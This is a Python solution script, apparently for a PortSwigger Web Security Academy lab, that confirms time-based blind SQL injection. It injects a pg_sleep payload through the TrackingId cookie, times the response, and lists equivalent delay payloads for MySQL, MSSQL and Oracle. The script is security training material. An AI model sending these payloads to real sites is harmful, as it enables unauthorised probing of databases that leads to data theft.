# Lab 14 — Blind SQL Injection: Time Delays
# PortSwigger: https://portswigger.net/web-security/sql-injection/blind/lab-time-delays
#
# Vulnerability: TrackingId cookie
# Aim:           Cause a 10-second delay to confirm time-based blind SQLi
#
# DB: PostgreSQL (identified by pg_sleep working; SLEEP(10) would be MySQL)
#
# Technique:
#   ' || (SELECT pg_sleep(10))--
#   The || forces evaluation of the subquery as part of string concatenation.
#   pg_sleep(10) blocks execution for 10 seconds → confirmed injectable.
#
# Why || instead of ; ?
#   Semicolons introduce stacked queries, which many drivers block.
#   || is string concatenation — it forces subquery evaluation without stacking.
#
# Usage: python lab14.py <url>

import sys
import time
import requests
import urllib3
from proxies import proxies
from sqli_utils import banner, section

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

DELAY_SECONDS = 10


if __name__ == "__main__":
    banner()
    section("LAB 14 — BLIND SQLi: TIME DELAYS (POSTGRESQL)")

    if len(sys.argv) != 2:
        print("  Usage: python lab14.py <url>")
        sys.exit(1)

    url = sys.argv[1]
    session = requests.Session()
    session.verify   = False
    session.proxies  = proxies

    session.get(url)
    tracking_id = session.cookies.get("TrackingId")

    payload = f"' || (SELECT pg_sleep({DELAY_SECONDS}))--"
    print(f"  ➜  Payload: {payload}\n")

    start    = time.time()
    session.get(url, cookies={"TrackingId": payload})
    elapsed  = time.time() - start

    print(f"  ⏱   Response time: {elapsed:.2f}s")

    if elapsed >= DELAY_SECONDS:
        print(f"\n  ★  Delay confirmed — time-based blind SQLi on PostgreSQL.")
    else:
        print(f"\n  ✘  No delay detected. Try a different DB's delay payload.")
        print("     MySQL:  ' || SLEEP(10)--")
        print("     MSSQL:  '; WAITFOR DELAY '0:0:10'--")
        print("     Oracle: ' || DBMS_PIPE.RECEIVE_MESSAGE(('a'),10)--")
